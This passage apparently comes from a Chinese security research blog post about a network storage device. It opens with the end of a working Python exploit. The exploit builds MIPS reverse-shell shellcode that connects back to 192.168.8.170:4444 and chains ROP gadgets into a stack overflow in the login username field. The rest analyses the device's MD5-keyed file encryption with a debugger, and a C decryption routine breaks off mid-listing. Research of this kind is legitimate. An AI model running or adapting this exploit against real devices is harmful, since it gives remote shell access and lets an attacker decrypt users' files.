<span class="comment"># sys_connect</span></span><br><span class="line">    <span class="comment"># a0: sockfd (stored on the stack)</span></span><br><span class="line">    <span class="comment"># a1: addr (data stored on the stack)</span></span><br><span class="line">    <span class="comment"># a2: addrlen</span></span><br><span class="line">    mipselshell+=<span class="string">"\xff\xff\xa2\xaf"</span>   <span class="comment"># sw v0,-1(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xff\xff\xa4\x8f"</span>   <span class="comment"># lw a0,-1(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xfd\xff\x0f\x34"</span>   <span class="comment"># li t7,0xfffd</span></span><br><span class="line">    mipselshell+=<span class="string">"\x27\x78\xe0\x01"</span>   <span class="comment"># nor t7,t7,zero</span></span><br><span class="line">    mipselshell+=<span class="string">"\xe2\xff\xaf\xaf"</span>   <span class="comment"># sw t7,-30(sp)</span></span><br><span class="line">    mipselshell+=struct.pack(<span class="string">'&lt;2c'</span>,ports[<span class="number">1</span>],ports[<span class="number">0</span>]) + <span class="string">"\x0e\x3c"</span>   <span class="comment"># lui t6,0x1f90</span></span><br><span class="line">    mipselshell+=struct.pack(<span class="string">'&lt;2c'</span>,ports[<span class="number">1</span>],ports[<span class="number">0</span>]) + <span class="string">"\xce\x35"</span>   <span class="comment"># ori t6,t6,0x1f90</span></span><br><span class="line">    mipselshell+=<span class="string">"\xe4\xff\xae\xaf"</span>   <span class="comment"># sw t6,-28(sp)</span></span><br><span class="line">    mipselshell+=struct.pack(<span class="string">'&lt;2c'</span>,hosts[<span class="number">1</span>],hosts[<span class="number">0</span>]) + <span class="string">"\x0e\x3c"</span>   <span class="comment"># lui t6,0x7f01</span></span><br><span class="line">    mipselshell+=struct.pack(<span class="string">'&lt;2c'</span>,hosts[<span class="number">3</span>],hosts[<span class="number">2</span>]) + <span class="string">"\xce\x35"</span>   <span class="comment"># ori t6,t6,0x101</span></span><br><span class="line">    mipselshell+=<span class="string">"\xe6\xff\xae\xaf"</span>   <span class="comment"># sw t6,-26(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xe2\xff\xa5\x27"</span>   <span class="comment"># addiu a1,sp,-30</span></span><br><span class="line">    mipselshell+=<span class="string">"\xef\xff\x0c\x24"</span>   <span class="comment"># li t4,-17</span></span><br><span class="line">    mipselshell+=<span class="string">"\x27\x30\x80\x01"</span>   <span class="comment"># nor a2,t4,zero</span></span><br><span class="line">    mipselshell+=<span class="string">"\x4a\x10\x02\x24"</span>   <span class="comment"># li v0,4170  # sys_connect</span></span><br><span class="line">    mipselshell+=<span class="string">"\x0c\x01\x01\x01"</span>   <span class="comment"># syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># sys_dup2</span></span><br><span class="line">    <span class="comment"># a0: oldfd (socket)</span></span><br><span class="line">    <span class="comment"># a1: newfd (0, 1, 2)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xfd\xff\x11\x24"</span>   <span class="comment"># li s1,-3</span></span><br><span class="line">    mipselshell+=<span class="string">"\x27\x88\x20\x02"</span>   <span class="comment"># nor s1,s1,zero</span></span><br><span class="line">    mipselshell+=<span class="string">"\xff\xff\xa4\x8f"</span>   <span class="comment"># lw a0,-1(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\x21\x28\x20\x02"</span>   <span class="comment"># move a1,s1 # dup2_loop</span></span><br><span class="line">    mipselshell+=<span class="string">"\xdf\x0f\x02\x24"</span>   <span class="comment"># li v0,4063 # sys_dup2</span></span><br><span class="line">    mipselshell+=<span class="string">"\x0c\x01\x01\x01"</span>   <span class="comment"># syscall 0x40404</span></span><br><span class="line">    mipselshell+=<span class="string">"\xff\xff\x10\x24"</span>   <span class="comment"># li s0,-1</span></span><br><span class="line">    mipselshell+=<span class="string">"\xff\xff\x31\x22"</span>   <span class="comment"># addi s1,s1,-1</span></span><br><span class="line">    mipselshell+=<span class="string">"\xfa\xff\x30\x16"</span>   <span class="comment"># bne s1,s0,68 &lt;dup2_loop&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># sys_execve</span></span><br><span class="line">    <span class="comment"># a0: filename (stored on the stack) "//bin/sh"</span></span><br><span class="line">    <span class="comment"># a1: argv "//bin/sh"</span></span><br><span class="line">    <span class="comment"># a2: envp (null)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xff\xff\x06\x28"</span>   <span class="comment"># slti a2,zero,-1</span></span><br><span class="line">    mipselshell+=<span class="string">"\x62\x69\x0f\x3c"</span>   <span class="comment"># lui t7,0x2f2f "bi"</span></span><br><span class="line">    mipselshell+=<span class="string">"\x2f\x2f\xef\x35"</span>   <span class="comment"># ori t7,t7,0x6269 "//"</span></span><br><span class="line">    mipselshell+=<span class="string">"\xec\xff\xaf\xaf"</span>   <span class="comment"># sw t7,-20(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\x73\x68\x0e\x3c"</span>   <span class="comment"># lui t6,0x6e2f "sh"</span></span><br><span class="line">    mipselshell+=<span class="string">"\x6e\x2f\xce\x35"</span>   <span class="comment"># ori t6,t6,0x7368 "n/"</span></span><br><span class="line">    mipselshell+=<span class="string">"\xf0\xff\xae\xaf"</span>   <span class="comment"># sw t6,-16(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xf4\xff\xa0\xaf"</span>   <span class="comment"># sw zero,-12(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xec\xff\xa4\x27"</span>   <span class="comment"># addiu a0,sp,-20</span></span><br><span class="line">    mipselshell+=<span class="string">"\xf8\xff\xa4\xaf"</span>   <span class="comment"># sw a0,-8(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xfc\xff\xa0\xaf"</span>   <span class="comment"># sw zero,-4(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xf8\xff\xa5\x27"</span>   <span class="comment"># addiu a1,sp,-8</span></span><br><span class="line">    mipselshell+=<span class="string">"\xab\x0f\x02\x24"</span>   <span class="comment"># li v0,4011 # sys_execve</span></span><br><span class="line">    mipselshell+=<span class="string">"\x0c\x01\x01\x01"</span>  <span class="comment"># syscall 0x40404</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'ending ...'</span></span><br><span class="line">    <span class="keyword">return</span> mipselshell</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"> </span><br><span class="line">    libc_base = <span class="number">0x77c1f000</span></span><br><span class="line">    sip=<span class="string">'192.168.8.170'</span>     <span class="comment">#reverse_tcp local_ip</span></span><br><span class="line">    sport = <span class="number">4444</span>            <span class="comment">#reverse_tcp local_port</span></span><br><span class="line"> </span><br><span class="line">    host = socket.ntohl(struct.unpack(<span class="string">'&lt;I'</span>,socket.inet_aton(sip))[<span class="number">0</span>])</span><br><span class="line">    shellcode = makepayload(host,sport)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s &lt;target ip&gt;"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">    payload = MIPSPayload(endianess=<span class="string">"little"</span>, badbytes=[])</span><br><span class="line">    payload.AddBuffer(<span class="number">1036</span>)                            <span class="comment"># fill offset = 1036</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x49818</span>, base=libc_base)    <span class="comment"># gadget 1: mipsrop.find("lw $ra, ") Modify register</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x0047E758</span>)            <span class="comment"># arg1</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x0047F758</span>)            <span class="comment"># arg2</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x00480758</span>)            <span class="comment"># arg3</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0xC</span>)                                <span class="comment"># fill</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s0</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x4E320</span>, base=libc_base)            <span class="comment"># s1 sleep addr 0x4E320               </span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s2</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s3</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x1E8AC</span>, base=libc_base)            <span class="comment"># s4 gadget 3: mipsrop.tail()            </span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s5</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s6</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s7</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># fp</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x4F970</span>, base=libc_base)            <span class="comment"># gadget 2: mipsrop.find("li $a0,1")                </span></span><br><span class="line">    <span class="comment"># payload.AddBuffer(0x40)                                # addiu $sp, 0x40</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x1C</span>)                                <span class="comment"># 0x28 - 0xc = 0x1c   </span></span><br><span class="line">    payload.AddAddress(<span class="number">0x4AC20</span>, base=libc_base)            <span class="comment"># s1 gadget 5: mipsrop.find("move $t9,$s0") </span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s2</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x16BC8</span>, base=libc_base)            <span class="comment"># ra gadget 4: mipsrop.stackfinder()         </span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s0</span></span><br><span class="line">    <span class="comment"># payload.AddBuffer(0x28)</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0xC</span>)                                <span class="comment"># 0xD8 - 0xC8 =&gt; 0x10 - 0x4 = 0xC</span></span><br><span class="line">    payload.Add(shellcode)</span><br><span class="line"> </span><br><span class="line">    pdata = &#123;</span><br><span class="line">        <span class="string">'opt'</span>    : <span class="string">'Login'</span>,</span><br><span class="line">        <span class="string">'state'</span>                : <span class="string">'login'</span>,</span><br><span class="line">        <span class="string">'username'</span>            :  payload.Build()</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        HTTP(ip).Send(<span class="string">'baidupcs.csp'</span>, data=pdata)</span><br><span class="line">    <span class="keyword">except</span> httplib.BadStatusLine:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Payload delivered."</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Payload delivery failed: %s"</span> % str(e)</span><br></pre></td></tr></table></figure><p>​    </p><p>漏洞存在的原因在于，调用 getvaluefrom_url 函数时，缺少对 username 等值进行长度检查校验，而直接写入缓冲区中，导致了栈溢出。通过漏洞攻击者可直接获取到远程管理的密码，进行登入操作。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134427372.png" alt="image-20201113134427372"></p><h3 id="第四步：文件加密分析"><a href="#第四步：文件加密分析" class="headerlink" title="第四步：文件加密分析"></a>第四步：文件加密分析</h3><p>使用手机 app 进行文件加解密，然后通过路由器抓取数据包，其加解密 url path为 protocol.csp，根据前面整理的表格，其使用的端口是 81 端口。接下来分析此时监听 81 端口的所属进程 ioos。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134543095.png" alt="image-20201113134543095"></p><p>文件加密和解密数据包使用 wireshark 分析，再通过数据包的关键信息定位到加解密位置。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134616128.png" alt="image-20201113134616128"></p><p>开始调试前，我们先查看一下加密前后的文件</p><p>创建一个 test.txt 文件，并写入内容： abc</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134652524.png" alt="image-20201113134652524"></p><p>通过硬盘 app 进行加密，key 为 <strong>123</strong>，加密后文件加上了 <code>.enc</code> 后缀，查看 /tmp/ioos.log 日志信息</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134703946.png" alt="image-20201113134703946"></p><p>查看 test.txt.enc 文件，其中尾部 <code>202cb962ac59075b964b07152d234b70</code> 是 test.txt 加密key 123 的 md5 值（0x20字节），而前面“fe2889d36e2045f4a3d362445aaaf72e”（0x20字节）接下代码中会遇到。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134714930.png" alt="image-20201113134714930"></p><h4 id="gdb-ida-动态调试"><a href="#gdb-ida-动态调试" class="headerlink" title="gdb + ida 动态调试"></a>gdb + ida 动态调试</h4><p>将编译 mipsel 架构 gdb 后生成的 gdbserver 拷贝到硬盘 /tmp 目录。</p><p>远程附加调试</p><p>在关键函数 sub_414260 处下断点，此函数参数一为解密文件路径，为解密key的md5值</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134742657.png" alt="image-20201113134742657"></p><p>比较成功后，调用 stat64 返回文件信息</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134750810.png" alt="image-20201113134750810"></p><p>判断文件字节数是否大于 2k (0x2000字节)，若小于0x2000字节，则拷贝 md5 值的前 16 位</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134800177.png" alt="image-20201113134800177"></p><p>打开文件，判断文件大小是否小于 0x41，然后移动文件指针至 0x3 字节处，也就是密文（0x3字节）后面的内容处</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134812177.png" alt="image-20201113134812177"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134815545.png" alt="image-20201113134815545"></p><p>strncmp 比较密文尾部前0x20字节是否为 “fe2889d36e2045f4a3d362445aaaf72e”，查看前面的<code>.enc</code> 文件可知，这正是 md5 值前面的 0x20 字节。紧接着比较 md5 值。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134825466.png" alt="image-20201113134825466"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134828931.png" alt="image-20201113134828931"></p><p>调用 ftruncate64 打开的解密文件截断到指定的长度(0x3)。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134839941.png" alt="image-20201113134839941"></p><p>读取密文，然后调用解密函数 sub_404E28。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134848303.png" alt="image-20201113134848303"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134851298.png" alt="image-20201113134851298"></p><p>加解密函数 sub_404E28，首先建立 0x0 – 0xff 的数组，利用 md5 值前 16 位生成 0x100 位字节数组。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134859971.png" alt="image-20201113134859971"></p><p>然后通过生成的字节数组对文件内容进行加密或解密。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134907567.png" alt="image-20201113134907567"></p><h3 id="解密成功"><a href="#解密成功" class="headerlink" title="解密成功"></a>解密成功</h3><p>将上面的加解密函数其转换为 c 语言代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;direct.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG <span class="meta-string">"fe2889d36e2045f4a3d362445aaaf72e"</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 若文件内容小于 0x2000 字节则每个字节进行加密，且 key 为 md5(key, 32) 的前 0x10 位</span></span><br><span class="line"><span class="comment">// 若文件内容大于 0x2000 字节则只对文件的前后各 0x1000 字节进行加密，且 key 为 md5(key, 32) 的全部 0x20 位</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">enc_fun</span><span class="params">(<span class="keyword">char</span>* pContent, <span class="keyword">char</span>* pKey, <span class="keyword">uint32_t</span> uFileLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 生成 0 - 0x100 数组</span></span><br><span class="line">    <span class="keyword">uint8_t</span> arr[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; ++i)</span><br><span class="line">        arr[i] = i;</span><br><span class="line">    <span class="comment">// 利用 md5值 前 16 位生成 hash 表</span></span><br><span class="line">    <span class="keyword">uint32_t</span> a0 = <span class="number">0</span>, t0 = <span class="number">0</span>, t2 = <span class="number">0</span>, len = <span class="number">0</span>, a1 = <span class="number">0</span>, a2 = <span class="number">0</span>, LO = <span class="number">0</span>, HI = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> v1 = (<span class="keyword">uint32_t</span>)arr, a3 = (<span class="keyword">uint32_t</span>)arr;</span><br><span class="line">    <span class="keyword">uint32_t</span> t1 = (<span class="keyword">uint32_t</span>)arr + <span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">while</span> (a3 != t1) &#123;</span><br><span class="line">        a1 = pKey[a0];</span><br><span class="line">        a0++;</span><br><span class="line">        len = <span class="built_in">strlen</span>(pKey);</span><br><span class="line">        LO = a0 / len;</span><br><span class="line">        HI = a0 % len;</span><br><span class="line">        a2 = *((<span class="keyword">uint8_t</span>*)a3);    <span class="comment">// a3 为 arr 的首地址</span></span><br><span class="line">        a3++;</span><br><span class="line">        a1 += a2;</span><br><span class="line">        a1 += t0;</span><br><span class="line">        a1 &amp;= <span class="number">0xff</span>;</span><br><span class="line">        t0 = a1 &amp; <span class="number">0xff</span>;</span><br><span class="line">        a1 = v1 + a1;</span><br><span class="line">        t2 = *((<span class="keyword">uint8_t</span>*)a1);</span><br><span class="line">        *((<span class="keyword">uint8_t</span>*)a3 - <span class="number">1</span>) = t2;</span><br><span class="line">        *((<span class="keyword">uint8_t</span>*)a1) = a2;</span><br><span class="line">        a1 = HI;</span><br><span class="line">        a0 = a1 &amp; <span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 对内容进行加密或解密</span></span><br><span class="line">    <span class="keyword">bool</span> isSuccessful = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> v0 = <span class="number">0</span>, s1 = uFileLen;</span><br><span class="line">    <span class="keyword">uint32_t</span> s2 = (<span class="keyword">uint32_t</span>)pContent;</span><br><span class="line">    a2 = <span class="number">0</span>, a1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// s1 = strlen(content);</span></span><br><span class="line">        <span class="keyword">if</span> (v0 &lt; s1)</span><br><span class="line">            a0 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            a0 = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (a0) &#123;</span><br><span class="line">            a0 = a1 + <span class="number">1</span>;</span><br><span class="line">            a0 &amp;= <span class="number">0xff</span>;</span><br><span class="line">            a1 = a0 &amp; <span class="number">0xff</span>;</span><br><span class="line">            a0 = v1 + a0;</span><br><span class="line">            a3 = *((<span class="keyword">uint8_t</span>*)a0);        <span class="comment">// *((uint8_t*)a0)</span></span><br><span class="line">            a2 += a3;</span><br><span class="line">            a2 &amp;= <span class="number">0xff</span>;</span><br><span class="line">            t0 = v1 + a2;</span><br><span class="line">            t1 = *((<span class="keyword">uint8_t</span>*)t0);</span><br><span class="line">            *((<span class="keyword">uint8_t</span>*)a0) = t1;</span><br><span class="line">            *((<span class="keyword">uint8_t</span>*)t0) = a3;</span><br><span class="line">            a0 = *((<span class="keyword">uint8_t</span>*)a0);</span><br><span class="line">            t0 = s2 + v0;    <span class="comment">// s2 为 content 的首地址，以 v0 迭代</span></span><br><span class="line">            a3 += a0;</span><br><span class="line">            a3 &amp;= <span class="number">0xff</span>;</span><br><span class="line">            a0 = *((<span class="keyword">uint8_t</span>*)t0);</span><br><span class="line">            a3 = *((<span class="keyword">uint8_t</span>*)v1 + a3);    <span class="comment">// *((uint8_t*)v1 + a3)</span></span><br><span class="line">            v0++;</span><br><span class="line">            a3 = a0 ^ a3;</span><br><span class="line">            <span class="comment">// seh     $v0              # 符号扩展半字</span></span><br><span class="line">            *((<span class="keyword">uint8_t</span>*)t0) = a3;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">enc_file</span><span class="params">(<span class="keyword">char</span>* pfilename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 打开文件</span></span><br><span class="line">    FILE* pFile = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//     char filename[260];</span></span><br><span class="line"><span class="comment">//     printf("filepath:");</span></span><br><span class="line"><span class="comment">//     scanf_s("%s", filename, 260);</span></span><br><span class="line">    <span class="keyword">if</span> (fopen_s(&amp;pFile, pfilename, <span class="string">"rb"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"打开文件失败\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    fseek(pFile, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="keyword">uint64_t</span> Length = ftell(pFile);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取文件字节数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">stat64</span> <span class="title">info</span>;</span></span><br><span class="line">    _stat64(pfilename, &amp;info);</span><br><span class="line">    <span class="keyword">uint64_t</span> fileSize = info.st_size;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"该文件一共 %lld 字节\n"</span>, fileSize);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 求出原文件字节数</span></span><br><span class="line">    <span class="keyword">uint64_t</span> fileLen = fileSize - <span class="number">0x40</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 读取 FLAG</span></span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">0x21</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    fseek(pFile, fileLen, SEEK_SET);</span><br><span class="line">    fread_s(flag, <span class="number">0x21</span>, <span class="number">0x20</span>, <span class="number">1</span>, pFile);</span><br><span class="line">    <span class="keyword">if</span> (strncpy_s(flag, FLAG, <span class="number">0x20</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"格式错误\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// printf("flag: %s\n", flag);</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取 key</span></span><br><span class="line">    <span class="keyword">char</span> md5[<span class="number">0x21</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> encSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> enctail = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (fileLen &gt; <span class="number">0x2000</span>) &#123;</span><br><span class="line">        <span class="comment">// 文件内容大于 0x2000 字节 读取 0x20 位key, 解密前 0x1000 字节</span></span><br><span class="line">        fread_s(md5, <span class="number">0x21</span>, <span class="number">0x20</span>, <span class="number">1</span>, pFile);</span><br><span class="line">        encSize = <span class="number">0x1000</span>;</span><br><span class="line">        enctail = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 文件内容小于 0x2000 字节 读取 0x10 位key, 解密所有字节</span></span><br><span class="line">        fread_s(md5, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">1</span>, pFile);</span><br><span class="line">        encSize = fileLen;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"md5: %s\n"</span>, md5);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 读取密文</span></span><br><span class="line">    <span class="comment">// char content[] = "\xfa\xe3\x80";</span></span><br><span class="line">    <span class="keyword">char</span>* content = <span 